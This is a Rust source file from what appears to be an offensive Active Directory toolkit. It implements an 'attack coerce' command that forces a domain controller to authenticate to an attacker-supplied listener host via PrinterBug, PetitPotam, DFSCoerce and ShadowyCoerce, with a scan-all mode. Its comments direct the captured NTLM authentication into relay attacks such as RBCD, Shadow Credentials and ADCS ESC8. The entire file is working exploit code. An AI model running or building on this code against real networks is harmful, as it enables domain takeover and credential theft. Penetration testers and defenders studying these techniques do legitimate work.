//! **1.4.8-D WS-COERCE-SENDER** (+ **1.5.0 WS-COERCER** scan-all mode). DC
//! authentication coercion via PrinterBug (MS-RPRN), PetitPotam (MS-EFSR),
//! DFSCoerce (MS-DFSNM), and ShadowyCoerce (MS-FSRVP). Sender side only — pair
//! with `attack relay` on 445 (**1.4.8-D WS-NTLMRELAYX-SMB-LDAP**) for the
//! listener that captures the DC's NetNTLMv2 and forwards it. The two verbs
//! together = the full "WS-COERCE-LISTENER" chain from the 1.4.8 plan.
//!
//! Each vector is a `try_*` helper returning a [`VectorOutcome`]; both the
//! single-pipe path (`--pipe`) and `--scan-all` render those, so the per-vector
//! logic lives in one place. `--scan-all` runs every vector over one login and
//! prints a which-fired matrix — the fastest way to learn how a DC is hardened.

use adhammer_core::sanitize_terminal_output as san;
use anyhow::Result;
use clap::Parser;
use smb2_client::SmbClient;

/// Coercion vector (pipe) selection for `attack coerce`.
///
/// Renamed from a bare `--pipe <string>` in 1.3.10 — clap now rejects
/// unknown values at parse time with a helpful list, instead of silently
/// forwarding through to `smb.open_pipe` where the failure surfaces as a
/// generic RPC fault a hundred lines later.
#[derive(clap::ValueEnum, Clone, Copy, Debug, PartialEq, Eq)]
pub(crate) enum CoercePipe {
    /// PrinterBug (MS-RPRN over \spoolss) — most reliable coercion on modern DCs.
    Spoolss,
    /// PetitPotam (MS-EFSR over \lsarpc) — restricted on Server 2016+ hardened DCs.
    Lsarpc,
    /// PetitPotam (MS-EFSR over \efsrpc) — restricted on Server 2016+ hardened DCs.
    Efsrpc,
    /// DFSCoerce (MS-DFSNM NetrDfsAddStdRoot over \netdfs).
    Netdfs,
    /// ShadowyCoerce (MS-FSRVP IsPathSupported over \FssagentRpc) — needs FS-VSS-Agent role.
    Fssagentrpc,
}

#[derive(Parser)]
pub(crate) struct CoerceArgs {
    #[command(flatten)]
    pub auth: crate::shared_args::SmbAuth,
    /// Attacker host the DC should authenticate to (UNC target)
    #[arg(long)]
    pub listener: String,
    /// Coercion vector (pipe name): spoolss (PrinterBug, MS-RPRN — most reliable on modern
    /// DCs), lsarpc / efsrpc (PetitPotam, MS-EFSR — restricted on 2016+), netdfs (DFSCoerce,
    /// MS-DFSNM), fssagentrpc (ShadowyCoerce, MS-FSRVP — needs FS-VSS-Agent role).
    /// Ignored when `--scan-all` is set.
    #[arg(long, value_enum, ignore_case = true, default_value = "spoolss")]
    pub pipe: CoercePipe,
    /// PrinterBug server name to open (defaults to --host; modern spoolers want the hostname/FQDN, not an IP)
    #[arg(long)]
    pub target: Option<String>,
    /// **1.5.0 WS-COERCER.** Try every coercion vector over one login and
    /// print a which-fired matrix (PrinterBug, PetitPotam ×2 pipes,
    /// DFSCoerce, ShadowyCoerce). Overrides `--pipe`.
    #[arg(long)]
    pub scan_all: bool,
    /// Emit JSON (scan-all only).
    #[arg(long)]
    pub json: bool,
}

/// The result of firing one coercion vector.
struct VectorOutcome {
    /// Human vector name, e.g. `PrinterBug`.
    vector: &'static str,
    /// Wire pipe / transport, e.g. `\spoolss`.
    pipe: &'static str,
    /// `Some(status)` if the trigger RPC was accepted (coercion fired);
    /// `None` if it failed / was patched (see `detail`).
    fired: Option<u32>,
    /// Sanitized human detail — the accepted status note, or why it failed.
    detail: String,
}

impl VectorOutcome {
    fn ok(vector: &'static str, pipe: &'static str, status: u32) -> Self {
        VectorOutcome {
            vector,
            pipe,
            fired: Some(status),
            detail: format!("accepted — status {status:#010x}"),
        }
    }
    fn fail(vector: &'static str, pipe: &'static str, why: impl std::fmt::Display) -> Self {
        VectorOutcome {
            vector,
            pipe,
            fired: None,
            detail: adhammer_core::sanitize_terminal_output(&why.to_string()),
        }
    }
}

pub(crate) async fn coerce(mut a: CoerceArgs) -> Result<()> {
    a.auth.password = crate::resolve_secret(&a.auth.password, "ADHAMMER_PASSWORD")?;

    let mut smb = SmbClient::connect(&a.auth.host).await?;
    smb.login(&a.auth.host, &a.auth.domain, &a.auth.user, &a.auth.password)
        .await?;
    smb.tree_connect(&format!("\\\\{}\\IPC$", a.auth.host))
        .await?;

    if a.scan_all {
        return scan_all(&mut smb, &a).await;
    }

    // Single-vector mode: run the selected vector and print its detail with the
    // original remediation hint on failure.
    let outcome = match a.pipe {
        CoercePipe::Spoolss => {
            let target = a.target.clone().unwrap_or_else(|| a.auth.host.clone());
            try_printerbug(&mut smb, &a, &target).await
        }
        CoercePipe::Lsarpc => try_efsr(&mut smb, &a, "lsarpc").await,
        CoercePipe::Efsrpc => try_efsr(&mut smb, &a, "efsrpc").await,
        CoercePipe::Netdfs => try_dfscoerce(&mut smb, &a).await,
        CoercePipe::Fssagentrpc => try_shadowcoerce(&mut smb, &a).await,
    };

    match outcome.fired {
        Some(status) => {
            println!(
                "[+] {} accepted via {} — status {status:#010x}",
                outcome.vector, outcome.pipe
            );
            println!(
                "    {} attempted auth to \\\\{}\\... (run a relay/listener to capture)",
                a.auth.host, a.listener
            );
        }
        None => {
            println!(
                "[-] {} via {} failed/patched: {}  ({})",
                outcome.vector,
                outcome.pipe,
                outcome.detail,
                remediation(a.pipe)
            );
        }
    }
    Ok(())
}

/// Remediation hint for a failed single-vector run (preserves the original UX).
fn remediation(pipe: CoercePipe) -> &'static str {
    match pipe {
        CoercePipe::Spoolss => "spooler off or remote RPC blocked",
        CoercePipe::Lsarpc | CoercePipe::Efsrpc => {
            "MS-EFSR restricted/removed on Server 2016+ — try --pipe spoolss"
        }
        CoercePipe::Netdfs => "netdfs picky about transport/auth-level on modern Windows",
        CoercePipe::Fssagentrpc => {
            "needs FS-VSS-Agent role + Backup Operators — try --pipe spoolss"
        }
    }
}

/// WS-COERCER: run every vector over the one authenticated session and report.
async fn scan_all(smb: &mut SmbClient, a: &CoerceArgs) -> Result<()> {
    let target = a.target.clone().unwrap_or_else(|| a.auth.host.clone());
    // Sequential (each awaits the shared &mut smb): PrinterBug, PetitPotam ×2, DFSCoerce, ShadowyCoerce.
    let outcomes = vec![
        try_printerbug(smb, a, &target).await,
        try_efsr(smb, a, "lsarpc").await,
        try_efsr(smb, a, "efsrpc").await,
        try_dfscoerce(smb, a).await,
        try_shadowcoerce(smb, a).await,
    ];

    let fired = outcomes.iter().filter(|o| o.fired.is_some()).count();

    if a.json {
        let rows = outcomes
            .iter()
            .map(|o| {
                format!(
                    "{{\"vector\":\"{}\",\"pipe\":\"{}\",\"fired\":{},\"detail\":\"{}\"}}",
                    o.vector,
                    jesc(o.pipe),
                    o.fired.is_some(),
                    jesc(&o.detail)
                )
            })
            .collect::<Vec<_>>()
            .join(",");
        println!(
            "{{\"host\":\"{}\",\"listener\":\"{}\",\"fired\":{fired},\"vectors\":[{rows}]}}",
            jesc(&a.auth.host),
            jesc(&a.listener)
        );
        return Ok(());
    }

    println!("\n== coercion scan-all → {} ==", san(&a.auth.host));
    for o in &outcomes {
        let mark = if o.fired.is_some() { "[+]" } else { "[-]" };
        println!("  {mark} {:<13} {:<14} {}", o.vector, o.pipe, o.detail);
    }
    if fired > 0 {
        println!(
            "\n  ** {fired} vector(s) FIRED — {} attempted NTLM auth to \\\\{}\\… \
             Run a relay/listener on the listener host to capture + relay it \
             (LDAP→RBCD/Shadow-Creds, or ADCS Web Enrollment for ESC8).",
            san(&a.auth.host),
            san(&a.listener)
        );
    } else {
        println!(
            "\n  no vector fired — this DC is hardened against all four coercion \
             families over the pipes tried (or the services are disabled)."
        );
    }
    Ok(())
}

async fn try_printerbug(smb: &mut SmbClient, a: &CoerceArgs, target: &str) -> VectorOutcome {
    use dcerpc::rprn::{printerbug_tcp, PrinterBug};
    // \spoolss SMB pipe first; modern spoolers may only expose ncacn_ip_tcp (via EPM).
    let via_pipe = match smb.open_pipe("spoolss").await {
        Ok(pipe) => match PrinterBug::bind(smb, pipe).await {
            Ok(mut client) => Some(client.coerce(target, &a.listener).await),
            Err(e) => Some(Err(e)),
        },
        Err(_) => None,
    };
    let result = match via_pipe {
        Some(r) => r,
        None => {
            printerbug_tcp(
                &a.auth.host,
                &a.auth.domain,
                &a.auth.user,
                &a.auth.password,
                target,
                &a.listener,
            )
            .await
        }
    };
    match result {
        Ok(status) => VectorOutcome::ok("PrinterBug", "\\spoolss", status),
        Err(e) => VectorOutcome::fail("PrinterBug", "\\spoolss", e),
    }
}

async fn try_efsr(smb: &mut SmbClient, a: &CoerceArgs, pipe_name: &'static str) -> VectorOutcome {
    use dcerpc::efsr::CoerceClient;
    let wire = if pipe_name == "lsarpc" {
        "\\lsarpc"
    } else {
        "\\efsrpc"
    };
    let pipe = match smb.open_pipe(pipe_name).await {
        Ok(p) => p,
        Err(e) => return VectorOutcome::fail("PetitPotam", wire, e),
    };
    let mut client = match CoerceClient::bind_sealed(
        smb,
        pipe,
        &a.auth.domain,
        &a.auth.user,
        &a.auth.password,
        &a.auth.host,
    )
    .await
    {
        Ok(c) => c,
        Err(e) => return VectorOutcome::fail("PetitPotam", wire, e),
    };
    match client.coerce(&a.listener).await {
        Ok(status) => VectorOutcome::ok("PetitPotam", wire, status),
        Err(e) => VectorOutcome::fail("PetitPotam", wire, e),
    }
}

async fn try_dfscoerce(smb: &mut SmbClient, a: &CoerceArgs) -> VectorOutcome {
    use dcerpc::dfsnm::CoerceClient as DfsClient;
    let pipe = match smb.open_pipe("netdfs").await {
        Ok(p) => p,
        Err(e) => return VectorOutcome::fail("DFSCoerce", "\\netdfs", e),
    };
    let mut client = match DfsClient::bind_sealed(
        smb,
        pipe,
        &a.auth.domain,
        &a.auth.user,
        &a.auth.password,
        &a.auth.host,
    )
    .await
    {
        Ok(c) => c,
        Err(e) => return VectorOutcome::fail("DFSCoerce", "\\netdfs", e),
    };
    match client.coerce(&a.listener).await {
        Ok(status) => VectorOutcome::ok("DFSCoerce", "\\netdfs", status),
        Err(e) => VectorOutcome::fail("DFSCoerce", "\\netdfs", e),
    }
}

async fn try_shadowcoerce(smb: &mut SmbClient, a: &CoerceArgs) -> VectorOutcome {
    use dcerpc::fsrvp::CoerceClient as VssClient;
    let pipe = match smb.open_pipe("FssagentRpc").await {
        Ok(p) => p,
        Err(e) => return VectorOutcome::fail("ShadowyCoerce", "\\FssagentRpc", e),
    };
    let mut client = match VssClient::bind_sealed(
        smb,
        pipe,
        &a.auth.domain,
        &a.auth.user,
        &a.auth.password,
        &a.auth.host,
    )
    .await
    {
        Ok(c) => c,
        Err(e) => return VectorOutcome::fail("ShadowyCoerce", "\\FssagentRpc", e),
    };
    match client.coerce(&a.listener).await {
        Ok(status) => VectorOutcome::ok("ShadowyCoerce", "\\FssagentRpc", status),
        Err(e) => VectorOutcome::fail("ShadowyCoerce", "\\FssagentRpc", e),
    }
}

fn jesc(s: &str) -> String {
    let clean = adhammer_core::sanitize_terminal_output(s);
    let mut out = String::with_capacity(clean.len());
    for c in clean.chars() {
        match c {
            '"' => out.push_str("\\\""),
            '\\' => out.push_str("\\\\"),
            c if (c as u32) < 0x20 => out.push_str(&format!("\\u{:04x}", c as u32)),
            c => out.push(c),
        }
    }
    out
}
